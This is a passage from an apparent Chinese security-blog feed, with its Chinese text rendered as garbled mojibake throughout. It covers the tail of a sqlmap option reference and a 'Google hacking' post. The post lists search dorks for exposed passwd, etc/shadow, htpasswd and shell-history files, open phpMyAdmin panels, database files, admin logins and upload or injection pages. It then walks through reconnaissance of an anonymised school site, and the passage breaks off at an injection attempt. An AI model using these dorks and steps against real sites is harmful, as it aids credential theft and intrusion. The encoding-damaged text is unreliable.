class="attribute">--csv-del</span>=CSVDEL Delimiting character used <span class="keyword">in</span> CSV output (default <span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="comment">## åˆ†éš”CSVè¾“å‡ºä¸­ä½¿ç”¨çš„å­—ç¬¦</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--dump-format</span>=DU.. Format of dumped data (CSV (default), HTML <span class="keyword">or</span> SQLITE)</span><br><span class="line"><span class="comment">## è½¬å‚¨æ•°æ®çš„æ ¼å¼</span></span><br><span class="line">â€‹</span><br><span class="line">--eta Display <span class="keyword">for</span> each output the estimated time of arrival</span><br><span class="line"><span class="comment">## æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´</span></span><br><span class="line">â€‹</span><br><span class="line">--flush-session Flush session files <span class="keyword">for</span> current target</span><br><span class="line"><span class="comment">## åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶</span></span><br><span class="line">â€‹</span><br><span class="line">--forms Parse <span class="keyword">and</span> test forms on target URL</span><br><span class="line"><span class="comment">## åœ¨ç›®æ ‡ç½‘å€ä¸Šè§£æå’Œæµ‹è¯•è¡¨å•</span></span><br><span class="line">â€‹</span><br><span class="line">--fresh-queries Ignore query results stored <span class="keyword">in</span> session file</span><br><span class="line"><span class="comment">## å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœ</span></span><br><span class="line">â€‹</span><br><span class="line">--hex Use DBMS hex function(s) <span class="keyword">for</span> data retrieval</span><br><span class="line"><span class="comment">## ä½¿ç”¨DBMS hexå‡½æ•°è¿›è¡Œæ•°æ®æ£€ç´¢</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--output-dir</span>=OUT.. Custom output directory path</span><br><span class="line"><span class="comment">## è‡ªå®šä¹‰è¾“å‡ºç›®å½•è·¯å¾„</span></span><br><span class="line">â€‹</span><br><span class="line">--parse-errors Parse <span class="keyword">and</span> display DBMS <span class="builtin-name">error</span> messages <span class="keyword">from</span> responses</span><br><span class="line"><span class="comment">## è§£æå’Œæ˜¾ç¤ºå“åº”ä¸­çš„DBMSé”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--save</span>=SAVECONFIG Save options <span class="keyword">to</span> a configuration INI file</span><br><span class="line"><span class="comment">## ä¿å­˜é€‰é¡¹åˆ°INIé…ç½®æ–‡ä»¶</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--scope</span>=SCOPE Regexp <span class="keyword">to</span><span class="built_in"> filter </span>targets <span class="keyword">from</span> provided<span class="built_in"> proxy </span>log</span><br><span class="line"><span class="comment">## ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤ç›®æ ‡</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--test-filter</span>=TE.. Select tests by payloads <span class="keyword">and</span>/<span class="keyword">or</span> titles (e.g. ROW)</span><br><span class="line"><span class="comment">## æ ¹æ®æœ‰æ•ˆè´Ÿè½½å’Œ/æˆ–æ ‡é¢˜(e.g. ROW)é€‰æ‹©æµ‹è¯•</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--test-skip</span>=TEST.. Skip tests by payloads <span class="keyword">and</span>/<span class="keyword">or</span> titles (e.g. BENCHMARK)</span><br><span class="line"><span class="comment">## æ ¹æ®æœ‰æ•ˆè´Ÿè½½å’Œ/æˆ–æ ‡é¢˜è·³è¿‡æµ‹è¯•ï¼ˆe.g. BENCHMARKï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line">--update Update sqlmap</span><br><span class="line"><span class="comment">## æ›´æ–°SqlMap</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Miscellaneousï¼ˆæ‚é¡¹ï¼‰"><a href="#Miscellaneousï¼ˆæ‚é¡¹ï¼‰" class="headerlink" title="Miscellaneousï¼ˆæ‚é¡¹ï¼‰"></a>Miscellaneousï¼ˆæ‚é¡¹ï¼‰</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Miscellaneousï¼ˆæ‚é¡¹ï¼‰:</span><br><span class="line">â€‹</span><br><span class="line">-z MNEMONICS Use short mnemonics (e.g. <span class="string">&quot;flu,bat,ban,tec=EU&quot;</span>)</span><br><span class="line"><span class="comment">## ä½¿ç”¨ç®€çŸ­çš„åŠ©è®°ç¬¦</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--alert</span>=ALERT <span class="builtin-name">Run</span> host OS command(s) when SQL injection is found</span><br><span class="line"><span class="comment">## åœ¨æ‰¾åˆ°SQLæ³¨å…¥æ—¶è¿è¡Œä¸»æœºæ“ä½œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--answers</span>=ANSWERS <span class="builtin-name">Set</span> question answers (e.g. <span class="string">&quot;quit=N,follow=N&quot;</span>)</span><br><span class="line"><span class="comment">## è®¾ç½®é—®é¢˜ç­”æ¡ˆ</span></span><br><span class="line">â€‹</span><br><span class="line">--beep Beep on question <span class="keyword">and</span>/<span class="keyword">or</span> when SQL injection is found</span><br><span class="line"><span class="comment">## å‘ç°SQL æ³¨å…¥æ—¶æé†’</span></span><br><span class="line">â€‹</span><br><span class="line">--cleanup Clean up the DBMS <span class="keyword">from</span> sqlmap specific UDF <span class="keyword">and</span> tables SqlMap</span><br><span class="line"><span class="comment">## å…·ä½“çš„UDFå’Œè¡¨æ¸…ç†DBMS</span></span><br><span class="line">â€‹</span><br><span class="line">--dependencies Check <span class="keyword">for</span> missing (non-core) sqlmap dependencies</span><br><span class="line"><span class="comment">## æ£€æŸ¥æ˜¯å¦ç¼ºå°‘ï¼ˆéå†…æ ¸ï¼‰sqlmapä¾èµ–å…³ç³»</span></span><br><span class="line">â€‹</span><br><span class="line">--disable-coloring <span class="builtin-name">Disable</span><span class="built_in"> console </span>output coloring</span><br><span class="line"><span class="comment">## ç¦ç”¨æ§åˆ¶å°è¾“å‡ºé¢œè‰²</span></span><br><span class="line">â€‹</span><br><span class="line"><span class="attribute">--gpage</span>=GOOGLEPAGE Use Google dork results <span class="keyword">from</span> specified<span class="built_in"> page </span>number</span><br><span class="line"><span class="comment">## ä½¿ç”¨Google dorkç»“æœæŒ‡å®šé¡µç </span></span><br><span class="line">â€‹</span><br><span class="line">--identify-waf Make a thorough testing <span class="keyword">for</span> a WAF/IPS/IDS protection</span><br><span class="line"><span class="comment">## å¯¹WAF / IPS / IDSä¿æŠ¤è¿›è¡Œå…¨é¢æµ‹è¯•</span></span><br><span class="line">â€‹</span><br><span class="line">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span><br><span class="line"><span class="comment">## è·³è¿‡å¯å‘å¼æ£€æµ‹WAF / IPS / IDSä¿æŠ¤</span></span><br><span class="line">â€‹</span><br><span class="line">--mobile Imitate smartphone through HTTP User-Agent header</span><br><span class="line"><span class="comment">##  é€šè¿‡HTTP User-Agentæ ‡å¤´æ¨¡ä»¿æ™ºèƒ½æ‰‹æœº</span></span><br><span class="line">â€‹</span><br><span class="line">--offline Work <span class="keyword">in</span> offline mode (only use session data)</span><br><span class="line"><span class="comment">## åœ¨ç¦»çº¿æ¨¡å¼ä¸‹å·¥ä½œï¼ˆä»…ä½¿ç”¨ä¼šè¯æ•°æ®ï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line">--page-rank Display<span class="built_in"> page </span>rank (PR) <span class="keyword">for</span> Google dork results</span><br><span class="line"><span class="comment">##  Google dorkç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰</span></span><br><span class="line">â€‹</span><br><span class="line">--purge-output Safely <span class="builtin-name">remove</span> all content <span class="keyword">from</span> output directory</span><br><span class="line"><span class="comment">##  å®‰å…¨åœ°ä»è¾“å‡ºç›®å½•ä¸­åˆ é™¤æ‰€æœ‰å†…å®¹</span></span><br><span class="line">â€‹</span><br><span class="line">--smart Conduct thorough tests only <span class="keyword">if</span> positive heuristic(s)</span><br><span class="line"><span class="comment">## åªæœ‰åœ¨æ­£å¯å‘å¼æ—¶æ‰è¿›è¡Œå½»åº•æµ‹è¯•</span></span><br><span class="line">â€‹</span><br><span class="line">--sqlmap-shell Prompt <span class="keyword">for</span> an interactive sqlmap shell</span><br><span class="line"><span class="comment">## æç¤ºäº¤äº’å¼ sqlmap shell</span></span><br><span class="line">â€‹</span><br><span class="line">--wizard<span class="built_in"> Simple </span>wizard<span class="built_in"> interface </span><span class="keyword">for</span> beginner<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hacker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking</title>
      <link href="post/47235/"/>
      <url>post/47235/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Google hacker (Googleé»‘å®¢)æ˜¯åˆ©ç”¨GOOGLEæä¾›çš„æœç´¢åŠŸèƒ½æŸ¥æ‰¾é»‘å®¢ä»¬æƒ³æ‰¾åˆ°çš„ä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯æŸ¥æ‰¾ç½‘ç«™åå°ï¼Œç½‘ç®¡çš„ä¸ªäººä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æŸ¥æ‰¾æŸäººåœ¨ç½‘ç»œä¸Šçš„æ´»åŠ¨</p><p>Google hacker ä¸€èˆ¬æ˜¯åšä¸ºé»‘å®¢åœ¨å…¥ä¾µæ—¶çš„ä¸€ä¸ªæ‰‹æ®µï¼Œåœ¨å…¥ä¾µè¿‡ç¨‹ä¸­æœ‰æ—¶éœ€è¦æŸ¥æ‰¾åå°çš„ç™»é™†å£å°±éœ€è¦ç”¨åˆ°GOOGLE HACKERï¼Œæœ‰æ—¶çŒœè§£å¯†ç çš„æ—¶å€™googleä¹Ÿæ˜¯æä¾›æŸ¥æ‰¾ç®¡ç†å‘˜èµ„æ–™çš„æœ‰æ•ˆå¹³å°</p><span id="more"></span><h3 id="å¸¸ç”¨è¯­æ³•"><a href="#å¸¸ç”¨è¯­æ³•" class="headerlink" title="å¸¸ç”¨è¯­æ³•"></a>å¸¸ç”¨è¯­æ³•</h3><h4 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h4><p>è¿™ä¸ªå°±æ˜¯æŠŠç½‘é¡µä¸­çš„æ­£æ–‡å†…å®¹ä¸­çš„æŸä¸ªå­—ç¬¦åšä¸ºæœç´¢æ¡ä»¶ï¼Œä¾‹å¦‚åœ¨googleé‡Œè¾“å…¥<code>intext:åŠ¨æ¼«</code>ï¼Œå°†è¿”å›æ‰€æœ‰åœ¨ç½‘é¡µæ­£æ–‡éƒ¨åˆ†åŒ…å«â€åŠ¨æ¼«â€çš„ç½‘é¡µï¼Œ<code>allintext:</code>ä½¿ç”¨æ–¹æ³•å’Œ<code>intext</code>ç±»ä¼¼</p><h4 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h4><p>å’Œintextå·®ä¸å¤šï¼Œæœç´¢ç½‘é¡µæ ‡é¢˜ä¸­æ˜¯å¦æœ‰æ‰€è¦æ‰¾çš„å­—ç¬¦ï¼Œä¾‹å¦‚æœç´¢:<code>intitle:å®‰å…¨å¤©ä½¿</code>ï¼Œå°†è¿”å›æ‰€æœ‰ç½‘é¡µæ ‡é¢˜ä¸­åŒ…å«â€å®‰å…¨å¤©ä½¿â€çš„ç½‘é¡µï¼ŒåŒç†<code>allintitle:</code>ä¹ŸåŒ<code>intitle</code>ç±»ä¼¼</p><h4 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h4><p>æœç´¢googleé‡Œå…³äºæŸäº›å†…å®¹çš„ç¼“å­˜ï¼Œä¹Ÿè®¸èƒ½æ‰¾åˆ°ä¸€äº›å¥½ä¸œè¥¿</p><h4 id="define"><a href="#define" class="headerlink" title="define"></a>define</h4><p>æœç´¢æŸä¸ªè¯è¯­çš„å®šä¹‰ï¼Œæœç´¢:<code>define:hacker</code>ï¼Œå°†è¿”å›å…³äºhackerçš„å®šä¹‰</p><h4 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h4><p>æœç´¢æŒ‡å®šç±»å‹çš„æ–‡ä»¶ï¼Œæ’’ç½‘å¼æ”»å‡»è¿˜æ˜¯å¯¹ç‰¹å®šç›®æ ‡è¿›è¡Œä¿¡æ¯æ”¶é›†éƒ½éœ€è¦ç”¨åˆ°è¿™ä¸ªï¼Œä¾‹å¦‚è¾“å…¥:<code>filetype:doc</code>ï¼Œå°†è¿”å›æ‰€æœ‰ä»¥docç»“å°¾çš„æ–‡ä»¶URLï¼Œå¦‚æœæ‰¾.bakã€.mdbæˆ–.incä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè·å¾—çš„ä¿¡æ¯ä¹Ÿè®¸ä¼šæ›´ä¸°å¯Œ</p><h4 id="info"><a href="#info" class="headerlink" title="info"></a>info</h4><p>æŸ¥æ‰¾æŒ‡å®šç«™ç‚¹çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯</p><h4 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h4><p>æœç´¢:<code>inurl:www.123.net</code>å¯ä»¥è¿”å›æ‰€æœ‰å’Œ<code>www.123.net</code>åšäº†é“¾æ¥çš„URL</p><h4 id="site"><a href="#site" class="headerlink" title="site"></a>site</h4><p>æœç´¢:<code>site:www.123.net</code>ï¼Œå°†è¿”å›æ‰€æœ‰å’Œ123.netè¿™ä¸ªç«™æœ‰å…³çš„URL</p><p>è¿˜æœ‰ä¸€äº›æ“ä½œç¬¦ä¹Ÿæ˜¯å¾ˆæœ‰ç”¨çš„:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â€“ æŠŠæŸä¸ªå­—å¿½ç•¥</span><br><span class="line"></span><br><span class="line">~ åŒæ„è¯</span><br><span class="line"></span><br><span class="line"><span class="bullet">. </span>å•ä¸€çš„é€šé…ç¬¦</span><br><span class="line"></span><br><span class="line">â€œâ€ ç²¾ç¡®æŸ¥è¯¢</span><br></pre></td></tr></table></figure><h3 id="å…¸å‹ç”¨æ³•"><a href="#å…¸å‹ç”¨æ³•" class="headerlink" title="å…¸å‹ç”¨æ³•"></a>å…¸å‹ç”¨æ³•</h3><ul><li>æ‰¾ç®¡ç†åå°åœ°å€</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">site:</span>xxx.com intextï¼šç®¡ç†åå°ç™»é™†ç”¨æˆ·åå¯†ç ç³»çµ±è´¦å·</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">site:</span>xxx.com inurl: login<span class="meta-keyword">/admin/</span>manage<span class="meta-keyword">/manager/</span>adminlogin/system </span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">site:</span>xxx.com intitle ç®¡ç†åå°ç™»é™†</span><br></pre></td></tr></table></figure><ul><li>æ‰¾ä¸Šä¼ ç±»æ¼æ´åœ°å€ï¼š</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:file</span> </span><br><span class="line"></span><br><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:upload</span> </span><br></pre></td></tr></table></figure><ul><li>æ‰¾æ³¨å…¥é¡µé¢</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:php</span>?id=</span><br></pre></td></tr></table></figure><ul><li>æ‰¾ç¼–è¾‘å™¨é¡µé¢</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:ewebeditor</span></span><br></pre></td></tr></table></figure><h3 id="å®é™…åº”ç”¨"><a href="#å®é™…åº”ç”¨" class="headerlink" title="å®é™…åº”ç”¨"></a>å®é™…åº”ç”¨</h3><p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå¯èƒ½æœ€æ„Ÿå…´è¶£çš„å°±æ˜¯å¯†ç æ–‡ä»¶äº†ï¼Œè€Œgoogleæ­£å› ä¸ºå…¶å¼ºå¤§çš„æœç´¢èƒ½åŠ›å¾€å¾€ä¼šæŠŠä¸€äº›æ•æ„Ÿä¿¡æ¯é€éœ²å‡ºæ¥ï¼Œç”¨googleæœç´¢ä»¥ä¸‹å†…å®¹</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ etc</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€Index ofâ€ .sh_history</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€Index ofâ€ .bash_history</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ passwd</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ people.lst</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ pwd<span class="meta">.db</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ spwd</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ master.passwd</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>â€index ofâ€ htpasswd</span><br><span class="line"></span><br><span class="line">â€œ<span class="meta"># -FrontPage-â€ inurl:service.pwd</span></span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥ç”¨googleæ¥æœç´¢ä¸€äº›å…·æœ‰æ¼æ´çš„ç¨‹åºï¼Œä¾‹å¦‚ZeroBoardå‰æ®µæ—¶é—´å‘ç°ä¸ªæ–‡ä»¶ä»£ç æ³„éœ²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨googleæ¥æ‰¾ç½‘ä¸Šä½¿ç”¨è¿™å¥—ç¨‹åºçš„ç«™ç‚¹:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">intext</span>:<span class="type">ZeroBoard</span> file<span class="keyword">type</span>:php</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">inurl:</span>ã€€outlogin.php?_zb_path= site:.jp</span><br></pre></td></tr></table></figure><p>phpmyadminæ˜¯ä¸€å¥—åŠŸèƒ½å¼ºå¤§çš„æ•°æ®åº“æ“ä½œè½¯ä»¶ï¼Œä¸€äº›ç«™ç‚¹ç”±äºé…ç½®å¤±è¯¯ï¼Œå¯¼è‡´å¯ä»¥ä¸ä½¿ç”¨å¯†ç ç›´æ¥å¯¹phpmyadminè¿›è¡Œæ“ä½œï¼Œå¯ä»¥ç”¨googleæœç´¢å­˜åœ¨è¿™æ ·æ¼æ´çš„ç¨‹åº</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:phpmyadmin intext:<span class="keyword">Create</span> <span class="built_in">new</span> <span class="keyword">database</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨googleæ¥æœç´¢æ•°æ®åº“æ–‡ä»¶ï¼Œç”¨ä¸Šä¸€äº›è¯­æ³•æ¥ç²¾ç¡®æŸ¥æ‰¾èƒ½å¤Ÿè·å¾—æ›´å¤šä¸œè¥¿(accessçš„æ•°æ®åº“,mssqlã€mysqlçš„è¿æ¥æ–‡ä»¶ç­‰ç­‰)</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">allinur<span class="variable">l:bbs</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">filetype</span>:mdb inur<span class="variable">l:database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">filetype</span>:inc conn</span><br><span class="line"></span><br><span class="line">inur<span class="variable">l:data</span> <span class="keyword">filetype</span>:mdb</span><br><span class="line"></span><br><span class="line">intitle:â€<span class="built_in">index</span> ofâ€ data //åœ¨ä¸€äº›é…ç½®ä¸æ­£ç¡®çš„apache+win32çš„æœåŠ¡å™¨ä¸Šç»å¸¸å‡ºç°è¿™ç§æƒ…å†µ</span><br></pre></td></tr></table></figure><h3 id="å®æˆ˜æ¼”ç¤º"><a href="#å®æˆ˜æ¼”ç¤º" class="headerlink" title="å®æˆ˜æ¼”ç¤º"></a>å®æˆ˜æ¼”ç¤º</h3><p>åˆ©ç”¨googleå®Œå…¨æ˜¯å¯ä»¥å¯¹ä¸€ä¸ªç«™ç‚¹è¿›è¡Œä¿¡æ¯æ”¶é›†å’Œæ¸—é€çš„ï¼Œä¸‹é¢ç”¨googleå¯¹ç‰¹å®šç«™ç‚¹è¿›è¡Œä¸€æ¬¡æµ‹è¯•</p><p>é¦–å…ˆç”¨googleå…ˆçœ‹è¿™ä¸ªç«™ç‚¹çš„ä¸€äº›åŸºæœ¬æƒ…å†µ</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">site:</span>xxxx.com</span><br></pre></td></tr></table></figure><p>ä»è¿”å›çš„ä¿¡æ¯ä¸­ï¼Œæ‰¾åˆ°å‡ ä¸ªè¯¥æ ¡çš„å‡ ä¸ªç³»é™¢çš„åŸŸåï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>a1.xxxx.com</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a2.xxxx.com</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a3.xxxx.com</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a4.xxxx.com</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿pingäº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯åœ¨ä¸åŒçš„æœåŠ¡å™¨ï¼Œå­¦æ ¡ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸å°‘å¥½çš„èµ„æ–™</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">site</span>:xxxx.com file<span class="keyword">type</span>:doc</span><br></pre></td></tr></table></figure><p>å¾—åˆ°Nä¸ªä¸é”™çš„docã€‚å…ˆæ‰¾æ‰¾ç½‘ç«™çš„ç®¡ç†åå°åœ°å€ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:xxxx.<span class="keyword">com</span> intex<span class="variable">t:</span>ç®¡ç†</span><br><span class="line"></span><br><span class="line">site:xxxx.<span class="keyword">com</span> inur<span class="variable">l:login</span></span><br><span class="line"></span><br><span class="line">site:xxxx.<span class="keyword">com</span> intitle:ç®¡ç†</span><br></pre></td></tr></table></figure><p>è¶…è¿‡è·å¾—2ä¸ªç®¡ç†åå°åœ°å€ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>a2.xxxx.com<span class="regexp">/sys/</span>admin_login.asp</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a3.xxxx.com:<span class="number">88</span><span class="regexp">/_admin/</span>login_in.asp</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹æœåŠ¡å™¨ä¸Šè·‘çš„æ˜¯ä»€ä¹ˆç¨‹åºï¼š</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:asp</span><br><span class="line"></span><br><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:php</span><br><span class="line"></span><br><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:aspx</span><br><span class="line"></span><br><span class="line"><span class="title">site</span>:a3.xxxx.com file<span class="keyword">type</span>:asp</span><br></pre></td></tr></table></figure><p>a2æœåŠ¡å™¨ç”¨çš„åº”è¯¥æ˜¯IISï¼Œä¸Šé¢ç”¨çš„æ˜¯aspçš„æ•´ç«™ç¨‹åºï¼Œè¿˜æœ‰ä¸€ä¸ªphpçš„è®ºå›</p><p>a3æœåŠ¡å™¨ä¹Ÿæ˜¯IISï¼Œaspx+aspã€‚webç¨‹åºéƒ½åº”è¯¥æ˜¯è‡ªå·±å¼€å‘çš„ã€‚æœ‰è®ºå›é‚£å°±çœ‹çœ‹èƒ½ä¸èƒ½é‡è§ä»€ä¹ˆå…¬å…±çš„FTPå¸å·ä»€ä¹ˆçš„ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:a2<span class="selector-class">.xxxx</span><span class="selector-class">.com</span> intext:ftp:<span class="comment">//:</span></span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹æœ‰æ²¡æœ‰ä¸Šä¼ ä¸€ç±»çš„æ¼æ´ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:a2<span class="selector-class">.xxxx</span><span class="selector-class">.com</span> inurl:file</span><br><span class="line"></span><br><span class="line">site:a3<span class="selector-class">.xxxx</span><span class="selector-class">.com</span> inurl:load</span><br></pre></td></tr></table></figure><p>åœ¨a2ä¸Šå‘ç°ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>a2.xxxx.com<span class="regexp">/sys/u</span>ploadfile.asp</span><br></pre></td></tr></table></figure><p>ç”¨IEçœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æƒé™è®¿é—®ã€‚è¯•è¯•æ³¨å°„</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:asp</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬å­¦æ 